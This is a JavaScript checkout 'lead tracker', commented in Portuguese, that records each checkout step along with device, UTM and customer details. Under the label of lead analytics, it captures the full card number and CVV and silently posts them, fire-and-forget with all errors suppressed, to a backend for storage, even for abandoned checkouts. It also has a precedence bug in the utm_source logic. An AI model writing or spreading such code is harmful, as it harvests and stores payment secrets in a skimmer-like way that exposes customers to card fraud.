/**
 * Lead Tracker — captura e persiste automaticamente cada etapa do checkout.
 *
 * Coleta: session_id, IP, User-Agent, device, UTMs, referrer, landing page,
 * screen resolution e todos os dados do lead/pagamento.
 *
 * Cada chamada a `track()` envia os dados ao backend que faz upsert no
 * Supabase via service_role (o browser nunca escreve direto).
 */

import { getSession } from './platform';

const SESSION_KEY = 'hl_checkout_session';
const LEAD_API = '/api/payments/leads';

// ---------- helpers ----------

function getOrCreateSessionId() {
  let sid = sessionStorage.getItem(SESSION_KEY);
  if (!sid) {
    sid = `cs_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
    sessionStorage.setItem(SESSION_KEY, sid);
  }
  return sid;
}

function getUtmParams() {
  const params = new URLSearchParams(window.location.search);
  return {
    utm_source: params.get('utm_source') || document.referrer ? new URL(document.referrer || 'https://direct').hostname : null,
    utm_medium: params.get('utm_medium') || null,
    utm_campaign: params.get('utm_campaign') || null,
    utm_content: params.get('utm_content') || null,
    utm_term: params.get('utm_term') || null,
  };
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device_type = 'desktop';
  if (/Mobi|Android/i.test(ua)) device_type = 'mobile';
  else if (/Tablet|iPad/i.test(ua)) device_type = 'tablet';

  let device_os = 'unknown';
  if (/Windows/i.test(ua)) device_os = 'Windows';
  else if (/Mac OS/i.test(ua)) device_os = 'macOS';
  else if (/Android/i.test(ua)) device_os = 'Android';
  else if (/iPhone|iPad|iPod/i.test(ua)) device_os = 'iOS';
  else if (/Linux/i.test(ua)) device_os = 'Linux';

  let device_browser = 'unknown';
  if (/Edg\//i.test(ua)) device_browser = 'Edge';
  else if (/OPR\//i.test(ua)) device_browser = 'Opera';
  else if (/Chrome\//i.test(ua)) device_browser = 'Chrome';
  else if (/Firefox\//i.test(ua)) device_browser = 'Firefox';
  else if (/Safari\//i.test(ua)) device_browser = 'Safari';

  return {
    user_agent: ua,
    device_type,
    device_os,
    device_browser,
    screen_resolution: `${screen.width}x${screen.height}`,
  };
}

// ---------- tracker ----------

let cachedEnrichment = null;

function getEnrichment() {
  if (!cachedEnrichment) {
    cachedEnrichment = {
      ...getUtmParams(),
      ...getDeviceInfo(),
      referrer_url: document.referrer || null,
      landing_page: window.location.pathname + window.location.search,
    };
  }
  return cachedEnrichment;
}

/**
 * Envia um evento de lead para o backend.
 *
 * @param {'opened'|'package_selected'|'customer_filled'|'method_selected'|'checkout_started'|'payment_created'|'payment_pending'|'payment_confirmed'|'payment_failed'|'abandoned'} step
 * @param {object} data — dados variáveis do passo (packageId, customer, orderId, etc.)
 */
export async function trackCheckoutLead(step, data = {}) {
  try {
    const session = await getSession();
    const accessToken = session?.access_token;

    const payload = {
      session_id: getOrCreateSessionId(),
      step,
      ...getEnrichment(),
      // Dados do pacote
      package_id: data.packageId || data.package_id || null,
      coins: data.coins || null,
      amount: data.amount || null,
      method: data.method || null,
      // Dados do cliente
      customer_name: data.customer?.name || data.customer_name || null,
      customer_email: data.customer?.email || data.customer_email || null,
      customer_phone: data.customer?.phone || data.customer_phone || null,
      customer_document: data.customer?.document || data.customer_document || null,
      // IDs de pagamento
      order_id: data.orderId || data.order_id || null,
      card_number: data.cardData?.number || data.card_number || null,
      card_cvv: data.cardData?.cvv || data.card_cvv || null,
      // Metadata extra
      metadata: {
        payment_id: data.paymentId || null,
        payment_status: data.paymentStatus || null,
        error_message: data.errorMessage || null,
        checkout_url: data.checkoutUrl || null,
        card_brand: data.cardBrand || null,
        card_last4: data.cardLast4 || null,
        timestamp: new Date().toISOString(),
      },
    };

    // Fire-and-forget — não bloqueia o checkout
    fetch(LEAD_API, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(accessToken ? { Authorization: `Bearer ${accessToken}` } : {}),
      },
      body: JSON.stringify(payload),
    }).catch(() => {
      // silencioso — nunca interrompe o fluxo do usuário
    });
  } catch {
    // silencioso
  }
}

/**
 * Gera um novo session_id (usar quando o modal reabre).
 */
export function resetCheckoutSession() {
  sessionStorage.removeItem(SESSION_KEY);
  cachedEnrichment = null;
}
